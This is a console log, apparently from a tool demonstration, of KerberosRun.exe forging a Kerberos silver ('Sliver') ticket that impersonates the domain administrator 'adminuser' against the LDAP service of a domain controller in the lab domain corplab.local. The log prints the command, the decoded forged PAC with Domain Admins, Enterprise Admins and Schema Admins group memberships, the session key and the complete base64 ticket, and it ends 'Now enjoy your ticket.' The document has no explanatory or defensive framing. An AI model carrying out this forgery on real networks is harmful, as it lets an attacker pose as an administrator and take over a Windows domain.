```powershell
PS C:\Users> .\KerberosRun.exe --Sliver --domainsid  S-1-5-21-1977317821-1772133574-954835042 --rc4 [...] --service ldap --host dc1$ --user adminuser --domain corplab.local --verbose                                                                                                   
   __           __
  / /_____ ____/ /  ___ _______  ___ ______ _____
 /  '_/ -_) __/ _ \/ -_) __/ _ \(_-</ __/ // / _ \
/_/\_\\__/_/ /_.__/\__/_/  \___/___/_/  \_,_/_//_/

  v1.0.0

[*] Building Sliver Ticket ...
[*] Building PAC ...
   * [Decrypted SliverTicket Ticket]:
       - AuthTime :  5/27/2020 8:40:47 AM +00:00
       - StartTime :  5/27/2020 8:40:47 AM +00:00
       - EndTime :  5/27/2020 6:40:47 PM +00:00
       - RenewTill :  6/3/2020 8:40:47 AM +00:00
       - CRealm :  corplab.local
       - CName :
          - Type :  NT_PRINCIPAL
          - Name :  adminuser
       - AuthorizationData :
          - Type :  AdIfRelevant
             - Type :  AdWin2kPac
                - Type :  AdWin2kPac
                - Version :  0
                - LogonInfo :
                   - PacType :
                   - DomainId :
                      - Revision :  1
                      - IdentifierAuthority :  NTAuthority
                      - SubAuthority :  21, 1977317821, 1772133574, 954835042
                      - SubAuthorityCount :  4
                   - ExtraIds :
                   - DomainSid :
                      - Attributes :  0
                      - Id :  954835042
                      - Value :  S-1-5-21-1977317821-1772133574-954835042
                   - ExtraSidCount :  0
                   - ExtraSids :
                   - GroupCount :  5
                   - GroupId :  513
                   - GroupIds :
                      - RelativeId :  513
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - RelativeId :  512
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - RelativeId :  520
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - RelativeId :  518
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - RelativeId :  519
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                   - GroupSid :  S-1-5-21-1977317821-1772133574-954835042-513
                   - GroupSids :
                      - Id :  513
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-513
                      - Id :  512
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-512
                      - Id :  520
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-520
                      - Id :  518
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-518
                      - Id :  519
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_OWNER, SE_GROUP_INTEGRITY, SE_GROUP_INTEGRITY_ENABLED, SE_GROUP_RESOURCE, SE_GROUP_LOGON_ID
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-519
                   - HomeDirectory :
                   - HomeDrive :
                   - KickOffTime :  1/1/0001 12:00:00 AM +00:00
                   - LastFailedILogon :  1/1/1601 8:00:00 PM +00:00
                   - LastSuccessfulILogon :  1/1/1601 8:00:00 PM +00:00
                   - LogoffTime :  1/1/0001 12:00:00 AM +00:00
                   - LogonCount :  0
                   - LogonScript :
                   - LogonTime :  5/27/2020 8:40:47 AM +00:00
                   - ProfilePath :
                   - PwdCanChangeTime :  1/1/0001 12:00:00 AM +00:00
                   - PwdLastChangeTime :  1/1/0001 12:00:00 AM +00:00
                   - PwdMustChangeTime :  1/1/0001 12:00:00 AM +00:00
                   - Reserved1 :  0, 0
                   - Reserved3 :  0
                   - ResourceDomainId :
                   - ResourceDomainSid :
                   - ResourceGroupCount :  0
                   - ResourceGroupIds :
                   - ResourceGroups :
                   - SubAuthStatus :  0
                   - UserAccountControl :  ADS_UF_LOCKOUT, ADS_UF_NORMAL_ACCOUNT
                   - UserDisplayName :
                   - UserFlags :  LOGON_EXTRA_SIDS
                   - UserId :  500
                   - UserName :  adminuser
                   - UserSessionKey :  00000000000000000000000000000000
                   - UserSid :  S-1-5-21-1977317821-1772133574-954835042-500
                   - DomainName :  CORPLAB.LOCAL
                   - ServerName :
                   - BadPasswordCount :  0
                   - FailedILogonCount :  0
                - ClientInformation :
                   - PacType :  CLIENT_NAME_TICKET_INFO
                   - ClientId :  5/27/2020 8:40:47 AM +00:00
                   - Name :  adminuser
                   - NameLength :  18
                - KdcSignature :
                   - PacType :  0
                   - RODCIdentifier :  0
                   - Signature :  EF1E9FF8EB12D5AA3CDC495AD6D057C9
                   - SignatureData :  [...]
                   - Type :  KERB_CHECKSUM_HMAC_MD5
                   - Validated :  False
                   - Validator :
                      - Validator :  PaForUserChecksum
                      - Validator :  EF1E9FF8EB12D5AA3CDC495AD6D057C9
                - ServerSignature :
                   - PacType :  0
                   - RODCIdentifier :  0
                   - Signature :  ED9A3DBAEE67298CCE3945D7968EE0FD
                   - SignatureData :  [...]
                   - Type :  KERB_CHECKSUM_HMAC_MD5
                   - Validated :  False
                   - Validator :
                      - Validator :  PaForUserChecksum
                      - Validator :  ED9A3DBAEE67298CCE3945D7968EE0FD
                - DecodingErrors :
                - HasRequiredFields :  True
       - CAddr :
       - Flags :  PreAuthenticated, Initial, Renewable, Forwardable
       - Key :
          - EType :  RC4_HMAC_NT
          - Value :  CEC22E20AAC0FF470642013B9FD0CB7D
       - Transited :
          - Type :  0
          - Contents :
[*] Now you have a Sliver Ticket!
[+] SliverTicket Ticket Kirbi:
    - doIEoTCCBJ2gAwIBBaEDAgEWooIDsDCCA6xhggOoMIIDpKADAgEFoQ8bDWNvcnBsYWIubG9jYWyiJDAioAMCAQKhGzAZGwRsZGFwGxFkYzEuY29ycGxhYi5sb2NhbKOCA2QwggNgoAMCAReiggNXBIIDUwZXQPArGDZPB+Sy/VEr0dvHZzxuTgyjmi/Cjycbp3hiRFPPjYZARhHFmrTP5SB30Ht/VM7ed7VatlbcXBR+4dgGyT39fQFMr+T8qyzcsK36MR1Sa3szDZpBefxxq8rtevsYczyQbTQ9d3egdMJezSQveJ9I9seaRWIXSEyqAlJtRr9sIsL4gOkzO/V8f5PqwBgq9j36g9nDb5IYxor2orFeHGU++TJfc039YPSAdHMRFjBGIo1ogwkYJZQqGK3kzK2R7INSKv3qD19CiYN7VMet3UVSYpccOS7hwVIPzCc4XoxHaj2zONG6U3D9R9JJpI42mb8nn/yKM9iizuoAnBeGI5paAzQ63cC3HocbNmsuwcAeMJaPVtmncPmxqMaY352lqIc0k14RWxOTRnY0pvWWms59SVmhV+5t8pPgTb4pUMQ9ie5W4dH8bynSY7YcuJ8iMyx2cX/wup0KWAUspfZa4cFTD7BrAFoeEo0EYv/mE3eJ40koGdOVFKgoixV9d8S16tHSQA21Lcx4Yxdqj23MshgumgQY4Q0PR5shG/PGQquQQK9XIbyoI7l3sbxQ5+hwp02bCMJe3IeI6xMi5wFhhfrWtT6t3djHZqyPF/v7L6a24KG+MH4mCqZUDhSO1dFbd+KeBdFPj60f7XnrW9+4DGU5RdLO40h78kOA9SOB54j6C/Op9N8W5QM6GA6dYXm+kUD4c+Tg2/ldCoamSSANU2ba7XZaCeeKnoprjWlPO8ZzNmEGhape8jpEmW4fiDjVScPDd+2dsl8WwZEKKX5+ERJw5R7S1ecYFzCqSSLUxOxL9zJRDrh0l9yNGll6eGeft0vbrm4Fdw1fIp0uWbmWOhljcb2HWG8j5x3zty4ALbUA0dXJGUwDvvJRuIw2votHiFNTh/CS7X16JrElk06D3D+Ix4ohai6KyILW32mBz8/X36xyaAvsT0FZ8J8NMa9jJ4f5M3lSktoqrlUNO/sQMY3xFoV9kd+UM8ormt0w8UvAUMr53pL75mxaArzN3/96U5Ap7vBrA184luKnhWeL2lob+PUJDwWJGaJHZKHOK+O8fcvK51Nt2uutYBSTId4Ax0/j70TKssP44bANJOY6yML/s6qZS0gacUJVfbmsU3iao4HcMIHZoAMCAQCigdEEgc59gcswgciggcUwgcIwgb+gGzAZoAMCARehEgQQzsIuIKrA/0cGQgE7n9DLfaEPGw1jb3JwbGFiLmxvY2FsohYwFKADAgEBoQ0wCxsJYWRtaW51c2VyowcDBQBA4AAApREYDzIwMjAwNTI3MDg0MDQ3WqYRGA8yMDIwMDUyNzE4NDA0N1qnERgPMjAyMDA2MDMwODQwNDdaqA8bDWNvcnBsYWIubG9jYWypJDAioAMCAQKhGzAZGwRsZGFwGxFkYzEuY29ycGxhYi5sb2NhbA==
[*] Ticket Info:
    * KRB_CRED
    * pvno :  5
    * Tickets :  Kerberos.NET.Entities.KrbTicket
    * Encrypted Data :
       - Timestamp :
       - USec :
       - SAddress :
       - RAddress :
       - Nonce :
       - Ticket Info :
          - Realm :  corplab.local
          - PName :
             - Type :  NT_PRINCIPAL
             - Name :  adminuser
          - Flags :  PreAuthenticated, Initial, Renewable, Forwardable
          - AuthTime :
          - StartTime :  5/27/2020 8:40:47 AM +00:00
          - EndTime :  5/27/2020 6:40:47 PM +00:00
          - RenewTill :  6/3/2020 8:40:47 AM +00:00
          - SRealm :  corplab.local
          - SName :
             - Type :  NT_SRV_INST
             - Name :  ldap
          - Key :
             - EType :  RC4_HMAC_NT
             - KeyValue :  CEC22E20AAC0FF470642013B9FD0CB7D
[+] Done! Now enjoy your ticket.
```